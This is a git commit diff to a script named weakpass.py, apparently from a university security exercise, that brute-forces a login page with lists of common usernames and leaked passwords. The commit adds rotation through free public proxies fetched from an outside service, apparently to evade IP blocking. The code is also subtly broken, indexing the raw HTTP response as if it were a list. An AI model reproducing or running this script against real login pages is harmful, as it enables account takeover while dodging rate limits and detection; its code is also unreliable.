a517e8c62efd457fa156f18ead5b69ad0f06e2bd
Desiree Khoo <dhkhoo@usc.edu>
2023-03-23 16:53:27 -0700

    update weak password to change ip addresses

--- weakpass.py
+++ weakpass.py
@@ -1,5 +1,13 @@
 import requests
 
+session = requests.Session()
+
+ipIndex = 0
+curRequest = 0
+
+ip_addresses = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all')
+cur_ip = ip_addresses[ipIndex]
+
 # read passwords from file nord-pass.csv and store in list using comma delimiter
 with open('nord-pass.csv', 'r') as f:
     passwords = f.read().splitlines()
@@ -8,6 +16,14 @@ with open('popular-usernames.csv', 'r') as f:
     usernames = f.read().splitlines()
     
 for username in usernames:
+    # set requests ip to the next ip in the list
+    ipIndex = ipIndex + 1
+    if ipIndex == len(ip_addresses):
+        ipIndex = 0
+    
+    cur_ip = ip_addresses[ipIndex]
+    session.proxies = {'http': cur_ip, 'https': cur_ip}
+
     for password in passwords:
         url = 'http://blue/login.php?user=' + username + '&pass=' + password
         
